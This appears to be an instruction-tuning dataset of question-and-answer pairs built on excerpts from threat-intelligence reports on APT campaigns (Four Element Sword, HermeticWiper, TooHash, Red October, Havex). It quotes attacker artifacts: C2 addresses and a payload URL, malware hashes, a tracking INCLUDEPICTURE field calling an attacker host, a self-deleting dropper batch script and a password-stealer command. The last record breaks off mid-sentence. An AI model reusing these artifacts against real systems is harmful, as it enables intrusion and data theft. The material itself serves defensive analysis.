    "instruction": "Medium Headline: IOC's\nC2: \t\n  198.55.120[.]143:7386\nC2: URL: http://198.55.120[.]143:7386/B/ResN32.dll\nMD5 (RTF): 98bcd226890c5c2694ef9a34a23c9fbf\nMD5 (Elevate.dll): 1d335f6a58cb9fab503a9b9cb371f57b\nMD5 (QQMgr.dll): b9c584c7c34d14599de8cd3b72f2074b\nMD5 (QQMgr.inf): 8ac933be588f49560179c26ddbc6a753\nMD5 (ResN32.dat): 50753c28878ce10a748fbd7b831ecbe1\nMD5 (ResN32.dll): a45e5c32fc2bc7be9d6e4bba8b2807bf\nMD5 (hccutils.dll): 2299fb8268f47294eb2b18282540a955\nMD5 (hccutils.inf): 2f31ef1a8fca047ed0d623010d569857\nMD5 (hjwe.dat): d3601a5160b8d122261989d147221eb7\nMD5 (qhnj.dat): a9de62186cb8d0e23b0dc75e1ae373ac\nMD5 (tyeu.dat): 29ec20f5fa1817dc9250c434e61420ea\nMD5 (vnkd.dat): 35f4ce864c3a3dc016fea3459d6402a9\nMD5 (~1): b901f0b4aa6a3a6875235f96fce15839\nSHA-\u00ad\u2010256 (RTF): e13a0357cd51795100dbce25fe846783fbb7fd22c5efe438d9059edc10492f49\nSHA-\u00ad\u2010256 (Elevate.dll): 9c23febc49c7b17387767844356d38d5578727ee1150956164883cf555fe7f95 SHA-\u00ad\u2010256 (QQMgr.dll): bf1b00b7430899d33795ef3405142e880ef8dcbda8aab0b19d80875a14ed852f SHA-\u00ad\u2010256 (QQMgr.inf): ace7e3535f2f1fe32e693920a9f411eea21682c87a8e6661d3b67330cd221a2a SHA-\u00ad\u2010256 (ResN32.dat): 5b90fa081e3ac29a7339995f9b087dab9981409ff62e3215eb558908c6b96b14 SHA-\u00ad\u2010256 (ResN32.dll): 1cea4e49bd785378d8beb863bb8eb662042dffd18c85b8c14c74a0367071d9a7 SHA-\u00ad\u2010256 (hccutils.dll): 3dfc94605daf51ebd7bbccbb3a9049999f8d555db0999a6a7e6265a7e458cab9 SHA-\u00ad\u2010256 (hccutils.inf): f05cd0353817bf6c2cab396181464c31c352d6dea07e2d688def261dd6542b27 SHA-\u00ad\u2010256 (hjwe.dat): bb73261072d2ef220b8f87c6bb7488ad2da736790898d61f33a5fb7747abf48b SHA-\u00ad\u2010256 (qhnj.dat): c61dbc7b51caab1d0353cbba9a8f51f65ef167459277c1c16f15eb6c7025cfe3 SHA-\u00ad\u2010256 (tyeu.dat): e52b5ed63719a2798314a9c49c42c0ed4eb22a1ac4a2ad30e8bfc899edcea926 SHA-\u00ad\u2010256 (vnkd.dat): c22b40db7f9f8ebdbde4e5fc3a44e15449f75c40830c88932f9abd541cc78465\nSHA-\u00ad\u2010256 (~1): df50ea33616c916720c81d65563175d998a2c606360eeb3c8b727a482de3a4fc\nMedium Headline: Conclusion\nThreat\t\n \u00a0actors using similar exploit\t\n \u00a0code are launching or continuing a\t\n \u00a0variety of campaigns (termed as an \"engagement\" herein, where an engagement\t\n \u00a0is an offensive action within a\t\n \u00a0larger campaign context) aimed at\t\n \u00a0targets such as the Tibetan community, Hong Kong and Taiwanese media, and Asian human rights workers. Due to the easy delivery of RTF files as attachments and the observation of numerous spear phish samples which reveal precise targeting and timelines, it\t\n \u00a0is likely that\t\n \u00a0spearphish was the primary vector of choice for most\t\n \u00a0or all of the targeted exploitation scenarios profiled herein. The RTF files observed herein contained up to four unique exploits for various versions of Office. It\t\n \u00a0is hypothesized that\t\n \u00a0a\t\n \u00a0similar builder kit\t\n \u00a0\u2013 which \t\n \u00a0we've\t\n \u00a0named the Four Element\t\n \u00a0Sword Builder -\u00ad\u2010 is involved in the creation of these malicious documents, however future work is required to precisely classify the Four Element\t\n \u00a0Sword builder with respect\t\n \u00a0to crimeware and APT activity. In the case of the APT oriented threat\t\n \u00a0scenarios profiled herein, anywhere from 2-\u00ad\u20104 of the exploits were typically observed. In the case of the cybercrime activities that\t\n \u00a0will be profiled in a\t\n \u00a0separate forthcoming document, 2-\u00ad\u20103 of these exploits were typically observed.\nAll of the exploit\t\n  code observed deals with older vulnerabilities that\t\n  have been patched. However, considering the target\t\n  populations at\t\n  hand, it\t\n  is possible that\t\n  older systems may still be in use. Once APT actors gain a\t\n  toehold inside an organization, past\t\n  history shows that\t\n  it's just\t\n  a\t\n  matter of time before lateral movement\t\n  and further exploitation scenarios will unfold to implement\t\n  the actors actions on objectives. In the case of the Tibetan community, which has been under attack for years, there have been awareness campaigns designed to reduce risk by implementing special controls and procedures around dealing with attachments. Recently published documents by other security research organizations have revealed that\t\n  actors have evolved to newer methods in their ongoing efforts to stay beneath the radar.\nRegardless of the delivery method, the malware profiled herein are active threats likely deployed in numerous other scenarios by this, or by other groups of actors. While older exploit\t\n  code may be a\t\n  threat\t\n  to some populations and not\t\n  to others, the weaponization of other vulnerabilities is likely taking place and such malware can easily become a\t\n  payload in such a\t\n  case, making all analytic and detective insight\t\n  of the malicious code of relevance for defenders in the global defensive sphere.\nMedium Headline: About ASERT\nThe Arbor Security Engineering & Response Team (ASERT) at\t\n \u00a0Arbor Networks delivers world-\u00ad\u2010class network security research and analysis for the benefit\t\n \u00a0of today's enterprise and network operators. ASERT engineers and researchers are part\t\n \u00a0of an elite group of institutions that\t\n \u00a0are referred to as \"super remediators,\" and represent\t\n \u00a0the best\t\n \u00a0in information security. This is a\t\n \u00a0reflection of having both visibility and remediation capabilities at\t\n \u00a0a\t\n \u00a0majority of service provider networks globally.\nASERT shares operationally viable intelligence with hundreds of international Computer Emergency Response Teams (CERTs) and with thousands of network operators via\t\n  intelligence briefs and security content\t\n  feeds. ASERT also operates the world1s largest\t\n  distributed honeynet, actively monitoring Internet\t\n  threats around the clock and around the globe via\t\n  ATLAS\u00ae, Arbor's global network of sensors: http://atlas.arbor.net.\t\n  This\t\n  mission\t\n  and the associated resources that\t\n  Arbor Networks brings to bear to the problem of global Internet\t\n  security is an impetus for innovation and research.\nTo view the latest\t\n  research, news, and trends from Arbor, ASERT and the information security community at\t\n  large, visit\t\n  our Threat\t\n  Portal at\t\n  http://www.arbornetworks.com/threats/.\n\nAnswer this question based on the above context: What role does the Four Element Sword Builder play in the creation of malicious documents, and how can understanding this tool aid in future threat detection and prevention?",
    "output": "The Four Element Sword Builder is hypothesized to be a toolkit used to create malicious RTF documents that contain multiple exploits. Understanding the existence and functionality of this builder kit is crucial for several reasons. Firstly, it provides insights into the tactics, techniques, and procedures (TTPs) employed by the APT actors, allowing defenders to anticipate and prepare for similar attacks. Secondly, recognizing the patterns and characteristics of documents generated by this builder can enhance the effectiveness of static and dynamic analysis tools. By developing signatures or heuristics based on known artifacts, security teams can improve their ability to detect and prevent future threats that utilize similar weaponization techniques. This proactive approach strengthens overall defense posture and reduces the risk of successful exploitation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Background\nOn February 23rd, our friends at Symantec and ESET research tweeted hashes associated with a wiper attack in Ukraine, including one which is not publicly available as of this writing.\nWe started analyzing this new wiper malware, calling it 'HermeticWiper' in reference to the digital certificate used to sign the sample. The digital certificate is issued under the company name 'Hermetica Digital Ltd' and valid as of April 2021. At this time, we haven't seen any legitimate files signed with this certificate. It's possible that the attackers used a shell company or appropriated a defunct company to issue this digital certificate.\nHermeticWiper Digital Signature\nThis is an early effort to analyze the first available sample of HermeticWiper. We recognize that the situation on the ground in Ukraine is evolving rapidly and hope that we can contribute our small part to the collective analysis effort.\n\nQ: Why might the attackers behind HermeticWiper have chosen to use a digital certificate issued under the company name 'Hermetica Digital Ltd', and what implications does this have for cybersecurity professionals?",
    "output": "A: The attackers behind HermeticWiper may have chosen to use a digital certificate issued under the company name 'Hermetica Digital Ltd' to give their malware an appearance of legitimacy, making it less likely to be detected by traditional antivirus software. This tactic is known as using a 'shell company' or appropriating a defunct company to issue a digital certificate. For cybersecurity professionals, this highlights the importance of not solely relying on digital certificates for trust verification. It underscores the need for multi-layered security approaches, including behavioral analysis and continuous monitoring, to detect and mitigate such sophisticated attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The Malware used\nThe attached documents exploit a well-known and rather aged vulnerability () to drop a remote administration tool, or RAT for short, onto the targeted user's computer. During the campaign, we identified two different pieces of malware. Both include common cyber-espionage components such as code execution, file listing, document exfiltration and more.\nWe discovered more than 75 command and control servers, all used to administrate infected machines. The servers were mainly located in Hong Kong and the USA. Furthermore, the administration panel's language, used by the attackers to manage infected systems, was partly written in Chinese and partly in English.\nThe exploit used by the attackers is identified and blocked by G DATA's Exploit Protection technology and G DATA's security solutions detect the dropped binaries as Win32.Trojan.Cohhoc.A and Win32.Trojan.DirectsX.A respectively.\nMedium Headline: Targets\nThe analyzed samples used in the \"TooHash\" campaign were Microsoft Office documents, and were submitted to us from a Taiwanese customer.\nAn indication leading to the target area is one of the documents used by the attackers, which contained the string \"102\u5e74\u5c3e\u7259\u3001\" which means \"end of the year 102\". The official calendar used in Taiwan starts in 1912 (year 1), so the year 102 is the year 2013 according to the Gregorian calendar (1911+102=2013).\nWe conclude that the targets are entities located in the Greater China area and on the name of another document used by the attacker called \u674e\u8f89\u7b80\u5386.doc which translates to \"resume of Li Hui\".\nAnother lead, suggesting that the attacks occurred in the Greater China area, is the fact that the majority of samples available on VirusTotal were originally submitted from Taiwan.\nThe DNS-name of the C&C server contained information about affected companies. Here is a list of some targeted entities:\n\uf0a1\nPublic research organization\n\uf0a1\nSpace research organization\n\uf0a1\nTelecom companies\n\uf0a1\nPrivate companies\nMedium Headline: Spear Phishing Campaign\nTo drop the malware onto the targeted computer and to control the system, the attackers chose to carry out a spear phishing campaign. This campaign comprised a Microsoft Office document being sent to the victim. A probable entry point for a manipulated CV would be an HR department. If the document is opened with an outdated Microsoft Office version, malware is installed by exploiting vulnerability .\nTo appear credible, the attackers selected the targeted users and the type of the attached documents cleverly. For example, a Microsoft Office Word document called resume of Li Hui.doc. The document title as well as the content was written in Simplified Chinese. The titles of the attacking documents involved are as follows:\n\uf0a1\n\u6587\u4ef6\u5217\u8868.xls (file list) [Simplified Chinese]\n\uf0a1\n\u674e\u8f89\u7b80\u5386.doc (resume of Li Hui) [Simplified Chinese]\n\uf0a1\n102\u5e74\u5c3e\u7259\u3001103\u5e74\u6625\u9152\u7cbe\u7dfb\u83dc\u55ae.xls (End of the year 102, year 103 Spring Menu) [Traditional Chinese]\nMedium Headline: The Exploit used\nTo explain the exploit used, we have a look at the Word document, the ostensible CV. The mentioned exploit causes Microsoft Word to crash, which might alert attacked users just right away. In our case, the attackers crafted their malicious document in a special way to conceal the software crash: The malicious .doc causes a crash, but moments after the crash a legitimate Word session opens up and, to the user, everything appears to be normal. Nevertheless, cautious users might suspect malicious actions behind such activities and notify security staff.\nThe CV that comes with the legitimate Word document (Wo.doc) is written in Chinese characters and style used in the Chinese mainland. Nevertheless, this sample has also been submitted to us from Taiwan.\nScreenshot 1: Screenshot of the legitimate document which opens after \"resume of Li\" exploited Word\nMedium Headline: Tracking System\nThe resume visible to the user (Wo.doc) holds a tracking mechanism: Li Hui's picture, visible in the document as the blank square on the right hand side, is not stored locally but stored on the Internet. The following tag, inside the document, reveals this function:\n{ INCLUDEPICTURE\n\"http://mymail2.kmdns.net/track/ms.asp?key=jianli&AAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\" \\* MERGEFORMAT \\d\n}\nAs soon as the document is loaded, a network query is performed and notifies the attacker about the successful exploit and the availability of a newly infected machine.\nWe identified two types of malware used to administrate the infected machines: Cohhoc and DirectsX. The first one is a \"classic\" Remote Administration Tool. The second one is more advanced and of a different kind, the malware is a rootkit. It is executed in kernel mode.\nThe RAT and the rootkit both share the same command and control infrastructure.\nMedium Headline: Components\nThe malware is divided into three parts:\n\uf0a1 Component 1: the dropper, used to install the second component into a specific directory and to execute it. This first file is removed after the execution of the second component;\n\uf0a1 Component 2: a binary, used to unpack the third component and to execute it;\n\uf0a1 Component 3: the payload; this is the real malicious part, the core of the malware.\nThe second component is installed into a subfolder of the directory %APPDATA% (for example in %APPDATA%\\Microsoft\\). Known file names for the files used during the campaign discussed: svchost.exe and conime.exe.\nThe second component works similarly:\n\uf0a1 It decrypts the payload. The payload is encrypted with AES. We identified different keys for different samples.\n\uf0a1 It then loads the decrypted payload into the memory. Once decrypted, the payload is a Windows dynamic library (.dll).\n\uf0a1 It executes the loaded library.\nIn case you are interested in information regarding the unpacking of this malware, please feel free to contact us using toohash.securityblog@gdata.de\nMedium Headline: Variants\nDuring the TooHash campaign, we were able to identify two variants of \"Cohhoc\". Those two versions can be distinguished by looking at the creation of the respective mutex after the malware is started:\n\uf0a1 H2_COMMON_DLL (before September 2013)\n\uf0a1 NEW_H2_COMMON_DLL (after September 2013)\nScreenshot 2: Mutex creation\nThe main difference between the two malware variants is the handling of the payload (component three). In the earlier version, the payload is located within a resource inside component two. In the later version, the payload is\nan additional file. This additional file is stored in the same directory as the second component and its name is brndlog.\nAs small as this difference seems to be for a normal computer user, from a malware analyst's point of view, it is a huge difference. If, in the first case, the sample was found within a sample database, the analyst would be able to extract the payload and to analyze it right away. However, in the second case, the analyst cannot extract and analyze the payload at all. In this context, the second component alone is rather useless; one needs to find the binary which installs the payload. Furthermore, it is rather complex to create signature detection for an encrypted file, such as the payload discussed.\nMedium Headline: Persistence\nPersistence is ensured by the creation of a shortcut file (.lnk) in the Start Menu folder. This shortcut is labeled as Internet Explorer .lnk. The blank space just before the file name extension was inserted to trick the user. The text looks exactly like the original without the additional space. Furthermore, it is not only the file's name which sidetracks, but also the icon used for this link comes in the disguise of Microsoft's Internet Explorer. The screenshot below reveals that the actual file behind this shortcut points to a different program: conime.exe:\nMedium Headline: Features\nThe \"Cohhoc\" malware is a Remote Administration Tool and is able to:\n\uf0a1 execute commands or scripts;\n\uf0a1 download files;\n\uf0a1 upload files;\n\uf0a1 collect information about the infected system, for example hostname, username, version of the operating system, installed software;\n\uf0a1 find specific documents in order to send them to the command and control servers.\nScreenshot 3: Shortcut, used to guarantee persistence\nWithin the samples, we found two different hardcoded command and control servers and a feature to easily choose an alternative server. If the file %APPDATA%\\Adobe\\ActiveX.dat exists on the system, the malware uses the server listed in this file instead of the hardcoded servers. The content in the file must use the obfuscation system described in the next chapter.\nThis approach, using an extra file with server information, proves to be particularly useful for the attackers, as they do not have to transmit new payload to the infected system. Furthermore, it keeps analysts in the dark about additional C&Cs in case they only see the .dat file. This file alone is rather useless. We have seen the same technique when looking at the differences between the two malware variants before.\nMedium Headline: Obfuscation Layer\nThe \"Cohhoc\" malware uses an obfuscation layer, to disguise the malware and to complicate the analysis. The obfuscation is used:\n\uf0a1 to encode the command and controls;\n\uf0a1 to encode the data sent to the command and controls (information and documents);\n\uf0a1 to decode the data received from the command and controls (the commands).\nScreenshot 4: Algorithm used to encode the data\nScreenshot 5: Algorithm used to decode the data\nThis algorithm can easily be adapted in C language. Fellow researchers are welcome to receive the code after contacting samplerequest@gdata.de.\nTo be readable and easily usable, the base64 encoded data (in binary format) is converted into ASCII. Here is an example to decode a command and control:\npaul@gdata:~$ echo 3d3duIWRvYmVzZXJ2aWNlbi5ldE= | base64 -d | ./obfuscation \u2013d www.adobeservice.net\n\nHow did the 'TooHash' campaign ensure persistence on infected systems, and what techniques were used to disguise the malicious activity?",
    "output": "A: The 'TooHash' campaign ensured persistence on infected systems by creating a shortcut file (.lnk) in the Start Menu folder. This shortcut was labeled as 'Internet Explorer .lnk', with a blank space before the file name extension to trick the user. The icon used for this link was disguised as Microsoft's Internet Explorer, but it actually pointed to a different program, conime.exe. This technique allowed the malware to remain active and undetected on the infected system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT group Tarh Andishan use Brute Force: Password Guessing in their Operation Cleaver campaign to gain unauthorized access to targeted systems?",
    "output": "Brute Force: Password Guessing is a technique used by adversaries to systematically guess passwords to gain access to accounts without prior knowledge of legitimate credentials. In the case of Tarh Andishan's Operation Cleaver campaign, the group utilizes a tool called Nbrute, which uses NMap to map the network and then attempts to determine network credentials via brute force. This technique is used in conjunction with other methods, such as SQL injection and spear phishing, to gain initial access to targeted systems. By leveraging Brute Force: Password Guessing, Tarh Andishan is able to compromise Microsoft Windows web servers, Cisco VPNs, and other network infrastructure, ultimately allowing them to establish a persistent presence and exfiltrate sensitive data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: V. Summary\nThe multiple attacks discovered this time are all part of the large-scale cyber attack activities carried out by Lorec53 (Lori Bear) in different time periods from the end of 2021 to February 2022 against Ukrainian government departments, the military, and state-owned enterprises. The main targets of these attacks are still early detection and information collection, and they show the distinctive characteristics of Lorec53 at various stages.\nThe phishing lures captured this time show that Lorec53 has indeed inherited the organization's mercenary hacking characteristics when operating a national-level cyber attack campaign. Lorec53 will batch-produce and regularly adjust the content of phishing bait, with flexible download server\naddresses and CnC addresses, to indiscriminately harass and attack the exposed mailboxes of key Ukrainian institutions. This large-scale attack idea is similar to Lorec53's early operation idea as an email botnet operator.\nWith the changes in the situation in Eastern Europe, the activity of cyber espionage activities against Ukraine has increased significantly recently, and Fuying Lab will continue to pay attention to the progress of the activities of the Lorec53 organization.\nQ: How does Lorec53 (Lori Bear) adapt its phishing tactics to maximize the effectiveness of its cyber espionage campaigns against Ukrainian targets?",
    "output": "Lorec53 adapts its phishing tactics by batch-producing and regularly adjusting the content of phishing lures. They use flexible download server addresses and Command and Control (CnC) addresses to indiscriminately target the exposed mailboxes of key Ukrainian institutions. This approach allows them to maintain a high level of flexibility and adaptability, making it difficult for defenders to predict and counter their attacks. Additionally, this large-scale attack strategy is reminiscent of Lorec53's earlier operations as an email botnet operator, indicating a continuity in their modus operandi.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Main Findings\nAdvanced Cyber-espionage Network: The attackers have been active for at least several years, focusing on diplomatic and governmental agencies of various countries across the world.\nInformation harvested from infected networks was reused in later attacks. For example, stolen credentials were compiled in a list and used when the attackers needed to guess secret phrase in other locations. To control the network of infected machines, the attackers created more than 60 domain names and several server hosting locations in different countries (mainly Germany and Russia). The C&C infrastructure is actually a chain of servers working as proxies and hiding the location of the 'mothership' control server.\nUnique architecture: The attackers created a multi-functional kit which has a capability of quick extension of the features that gather intelligence. The system is resistant to C&C server takeover and allows the attack to recover access to infected machines using alternative communication channels.\nBroad variety of targets: Beside traditional attack targets (workstations), the system is capable of stealing data from mobile devices, such as smartphones (iPhone, Nokia, Windows Mobile), enterprise network equipment (Cisco), removable disk drives (including already deleted files via a custom file recovery procedure).\nImportation of exploits: The samples we managed to find were using exploit code for vulnerabilities in Microsoft Word and Microsoft Excel that were created by other attackers and employed during different cyber attacks. The attackers left the imported exploit code untouched, perhaps to harden the identification process.\nAttacker identification: Basing on registration data of C&C servers and numerous artifacts left in executables of the malware, we strongly believe that the attackers have Russian-speaking origins. Current attackers and executables developed by them have been unknown until recently, they have never related to any other targeted cyberattacks.\nMedium Headline: General description\nThese attacks comprised of the classical scenario of specific targeted attacks, consisting of two major stages:\n1. Initial infection\n2. Additional modules deployed for intelligence gathering\nThe malicious code was delivered via e-mail as attachments (Microsoft Excel, Word and, probably PDF documents) which were rigged with exploit code for known security vulnerabilities in the mentioned applications. In addition to Office documents (CVE-2009-3129, CVE-2010-3333, CVE-2012-0158), it appears that the attackers also infiltrated victim network(s) via Java exploitation (known as the 'Rhino' exploit (CVE-2011-3544).\nRight after the victim opened the malicious document or visit malicious URL on a vulnerable system, the embedded malicious code initiated the setup of the main component which in turn handled further communication with the C&C servers.\nNext, the system receives a number of additional spy modules from the C&C server, including modules to handle infection of smartphones.\nThe main purpose of the spying modules is to steal information. This includes files from different cryptographic systems, such as \"Acid Cryptofiler\", (see (<https://fr.wikipedia.org/wiki/Acid_Cryptofiler>)https://fr.wikipedia.org/wiki/Acid_Cryptofiler) which is known to be used in organizations of European Union/European Parliament/European Commission since the summer of 2011. All gathered information is packed, encrypted and only then transferred to the C&C server.\nMedium Headline: Step-by-step description (1st stage)\nDuring our investigation we couldn't find any e-mails used in the attacks, only top level dropper documents. Nevertheless, based on indirect evidence, we know that the e-mails can be sent using one of the following methods:\nUsing an anonymous mailbox from a free public email service provider\nUsing mailboxes from already infected organizations\nE-mail subject lines as well as the text in e-mail bodies varied depending on the target (recipient). The attached file contained the exploit code which activated a Trojan dropper in the system.\nWe have observed the use of at least three different exploits for previously known vulnerabilities: CVE-2009-3129 (MS Excel), CVE-2010-3333 (MS Word) and CVE-2012-0158 (MS Word). The first attacks that used the exploit for MS Excel started in 2010, while attacks targeting the MS Word vulnerabilities appeared in the summer of 2012.\nAs a notable fact, the attackers used exploit code that was made public and originally came from a previously known targeted attack campaign with Chinese origins. The only thing that was changed is the executable which was embedded in the document; the attackers replaced it with their own code.\nThe embedded executable is a file-dropper, which extracts and runs three additional files.\n%TEMP%MSC.BAT\n%ProgramFiles%WINDOWS NTLHAFD.GCP (<- This file name varies)\n%ProgramFiles%WINDOWS NTSVCHOST.EXE\nMSC.BAT file has the following contents:\nchcp 1251\n:Repeat\nattrib -a -s -h -r \"%DROPPER_FILE%\"\ndel \"%DROPPER_FILE%\"\nif exist \"%DROPPER_FILE%\" goto Repeat\ndel \"%TEMP%msc.bat\"\nAnother noteworthy fact is in the first line of this file, which is a command to switch the codepage of an infected system to 1251. This is required to address files and directories that contain Cyrillic characters in their names.\nThe \"LHAFD.GCP\" file is encrypted with RC4 and compressed with the \"Zlib\" library. This file is\nessentially a backdoor, which is decoded by the loader module (svchost.exe). The decrypted file is injected into system memory and is responsible for communication with the C&C server.\nOn any infected system, every major task is performed by the main backdoor component. The main component is started only after its loader (\"svchost.exe\") checks if the internet connection is available. It does so by connecting to three Microsoft hosts:\nupdate.microsoft.com\nwww.microsoft.com\nsupport.microsoft.com\nAfter the Internet connection is validated, the loader executes the main backdoor component that connects to its C&C servers:\nCapture of malware's communication with the C2\nThe connections with the C&C are encrypted - different encryption algorithms are used to send and receive data.\nEncrypted communication with the C2\nDuring our investigation, we found more than 60 different command-and-control domains. Each malware sample contains three such domains, which are hardcoded inside the main backdoor component:\nHardcoded C2 domains inside backdoor\nMedium Headline: Step-by-step description (2nd stage)\nAfter a connection with the C&C server is established, the backdoor starts the communication process, which leads to the loading of additional modules. These modules can be split into two categories: \"offline\" and \"online\". The main difference between these categories is their behavior on the infected system:\n\"Offline\": exists as files on local disk, capable of creating its own system registry keys, local disk log files, and may communicate with C&C servers on their own.\n\"Online\": exists only in system memory and is never saved to local disk, do not create registry keys, all logs are also kept in memory instead of local disk and sends the result of work to the C&C server using own code.\nThere is a notable module among all others, which is essentially created to be embedded into Adobe Reader and Microsoft Office applications. The main purpose of its code is to create a foolproof way to regain access to the target system. The module expects a specially crafted document with attached executable code and special tags. The document may be sent to the victim via e-mail. It will not have an exploit code and will safely pass all security checks. However, like with exploit case, the document will be instantly processed by the module and the module will start a malicious application attached to the document.\nThis trick can be used to regain access to the infected machines in case of unexpected C&C servers shutdown/takeover.\nBig Headline: Timeline\nWe have identified over 1000 different malicious files related to over 30 modules of this Trojan kit. Most of them were created between May 2010 and October 2012.\nThere were 115 file-creation dates identified which are related to these campaigns via emails during the last two and a half years. Concentration of file creation dates around a particular day may indicate date of the massive attacks (which was also confirmed by some of our side observations):\nMedium Headline: KSN statistics\nThe attackers used already detected exploit codes and because of this, in the beginning of the research we already had some statistics of detections with our anti-malware software. We searched for similar detections for the period of 2011-2012.\nThat is how we discovered more than 300 unique systems, which had detected at least one module of this Trojan kit.\nCountries with more than one infections\nOnce again, this is based on data from Kaspersky AV products. Apparently, real number and list of victim names is much larger than mentioned above.\n\nHow did the attackers behind Red October manage to maintain control over their network of infected machines, and what measures did they implement to ensure resilience against C&C server takeovers?",
    "output": "The attackers created a multi-functional kit capable of quickly extending its features for intelligence gathering. The system was designed to be resistant to C&C server takeovers and allowed the attack to recover access to infected machines using alternative communication channels. They created more than 60 domain names and several server hosting locations in different countries, mainly Germany and Russia. The C&C infrastructure consisted of a chain of servers working as proxies, hiding the location of the 'mothership' control server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "29 39ee448cf196304cfe9c6b1c2e436\n344 AATFfxXmUZl/j8JBAwHkk8BcwTIKDcex+0GQp/V9EX4nt64NGsGsTXFhuorwjKCRt6Av3v+hB+gT9mAP9kqY 3TnN1x+MUHaoib1dw8SG9mW5YL+JNu3Kwud/bYGu916U/EGh8PFGruVE2PHXD8EII710gKm00lyi5+Ehjn5C SLLPKwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAQAB\n\u2022 Create lock file in %TEMP%\\{rand}.tmp (empty)\n\u2022 Create debug log in %TEMP%\\{rand}.tmp.dat\nProgramm was started at %02i:%02i:%02i\n%02i:%02i:%02i.%04i:\n**************************************************************************\nStart finging of LAN hosts...\nFinding was fault. Unexpective error\nWas found %i hosts in LAN:\nHosts was't found.\nStart finging of OPC Servers...\nWas found %i OPC Servers.\n%i) [<comp_name>\\<ProgID>]\nOPC version support: <[+|-][+|-][+|-]>\nOPC Servers not found. Programm finished\nThread %02i return error code: <error_code>\nStart finging of OPC Tags...\n%i)[%s\\%s]\nSaved in 'OPCServer%02i.txt'\n%i)[%s] (not aviable)\nThread %02i was terminated by ThreadManager(2)\nThread %02i running...\nThread %02i finished.\n\u2022 Look for LAN resources using Windows Networking COM objects:\nWNetOpenEnumW\nWNetEnumResource\n\u2022 For each resource found, create a thread which checks if it's an OPC server & gets detailed OPC information using the following interfaces:\nand writes collected info to the OPCServer<nr>.txt file:\n%s  <%s> (Type=%i, Access=%i, ID='%s')\nOPC Server[%s\\%s] v%i.%i(b%i)\nServer state: %i\nGroup count value: %i\nServer band width: %08x\n\u2022 Compress all info with bzip2 and encrypt using a random 192 bit (168 effective) 3DES key\n\u2022 Save encrypted data to %TEMP%\\{rand}.yls file\n\u2022 *.yls files are then collected by the main Havex module and sent to C2.\nOutlook module\nThis module looks for outlook.nk2 files, gets the contact data from inside them and writes it to the *.yls file. Data is as always bzip2 compressed and 3DES encrypted. Config is stored in the resource HYT 017D (bzip2 compressed and encrypted with same xor key as always). Config consists of an RSA key ID (29 bytes), base 64 bit encodedRSA key (1024 bit) and nk2 file path (39 bytes).\noutlook.nk2 is the file where Outlook <= 2007 stores contacts details in order to use them in its AutoComplete feature.\nConfig from resource HYT 017D:\n29\n3e5bad153e3c3ee1b735f1926ba57\n344\nAATiBnMKBUxUwXUCXp4+ztY4nCTylL6KRsk6x44SgKDDNdQ9VB7UC86fQVLZOjpc2bdgFxi5tegJEE3SfZvQYJ1 PQ0s1zXh4xdXQxyEqllgGdaAcEOoM3dXCkQatFFYQ8pscbFkdLDrt/sWnbUTq2/KY8eCfW2QPhWgj7p8v6Cov1Q AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB 39\n%APPDATA%\\microsoft\\outlook\\outlook.nk2\nSysinfo module\nThis module collects the same type of information about the system as Havex versions 020 - 025. This functionality is not present in versions >=026 - it was probably moved into this separate module around that time.\nConfig in stored in resource WRT 2AF (xored with \"1312312\" and bzip2 compressed)\n29\n8900adffc5180c10d463530e3753a\n344\nAASjl8ZrgVvtb1XSXJgu6x1ZPjY32KQ9iyj+cQZpJgp/H+GhPdItvu10pBcgwIkc2uO2iYSJzXqfZAlS2fS9+W9 y1Xq/7lKuVJEeQC4vgn8EsTmzj4vLWV+oZOOJHrrv37YkXO6QGnFgREyLTLjnfnrTaoWg9pd6dkeC4yHEC7K8HQ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB\nNetwork scanner module\nThis module is used to decrypt and execute the binary that comes in the resource. The EXE file is saved in %TEMP%\\<rand>.exe and run using ShellExecuteExW.\nBesides the binary, resource HAJ 3A0 contains hex string: 30 0A 30 0A 34 38 36 34 30 0A 3rd stage tool: network scanner\nThis PE EXE file was dropped and run by EXE dropper module (2120c3a30870921ab5e0314 6a1a1a865dd24a2b5e6f0138bf9f2ebf02d490850). Its main functionality is to scan the local network looking for machines listening on specified ports. All information is logged into a %TEMP%\\~tracedscn.yls file in plain text.\n\u2022 List of port numbers hardcoded in the binary:\ndd 3071h\n; port 12401, used by 7-Technologies IGSS SCADA\n\u2022 Example content of log file:\n[!]Start\n[+]Get WSADATA\n\u2022 Error related strings:\n[-]Can not get local ip\n[-]Threads number > Hosts number\n[-]Can not create socket:\n[-]Connection error\n[!]End\nPSW dropper module\nThis module is used to decompress (bzip2) and drop a password dumping tool from resource DLL1 A8 409 to %TEMP%\\bp.exe and run it with the following command:\n%TEMP%\\bp.exe %TEMP%\\~tmp1237.txt\"\nSaved log is then copied to %TEMP%\\<rand>.tmp.yls file.\n3rd stage tool: password stealer\ncompiled: Thu, 02 Feb 2012 09:50:29 UTC\nThis file was 